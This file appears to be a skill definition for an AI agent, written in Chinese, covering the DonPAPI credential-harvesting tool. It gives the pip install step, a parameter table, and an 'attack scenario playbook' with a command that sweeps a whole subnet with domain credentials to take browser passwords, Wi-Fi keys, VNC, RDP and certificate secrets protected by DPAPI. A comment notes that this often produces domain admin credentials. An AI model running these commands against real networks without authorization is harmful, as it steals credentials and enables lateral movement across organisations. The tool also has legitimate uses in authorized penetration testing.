---
name: donpapi-dpapi-harvest
description: DonPAPI: 域内 DPAPI 凭据大扫荡。信号:ad攻击,域渗透,单机 triage,连通性测试,输出目录。
---

# DonPAPI

- 攻击大类:C30 AD与横向移动
- 上游仓库:https://github.com/login-securite/DonPAPI
- 上游 License:GPL-3.0(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
pip install donpapi
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `donpapi collect -u svc -p pass -d corp.local -t 10.0.0.0/24` | 批量收割 DPAPI 机密 |
| `donpapi triage -t 10.0.0.5` | 单机 triage |
| `donpapi test -t 10.0.0.5` | 连通性测试 |
| `-o out/` | 输出目录 |

## 攻击场景 Playbook

### 域内 DPAPI 凭据大扫荡

```bash
donpapi collect -u svc -p pass -d corp.local -t 10.0.0.0/24
# 浏览器保存密码/Wi-Fi/VNC/证书全收割,常直接出域管凭据
```

## 注意事项

login-securite 出品,远程批量收割 Windows DPAPI 保护的秘密(浏览器密码、VPN、RDP 凭据等)。
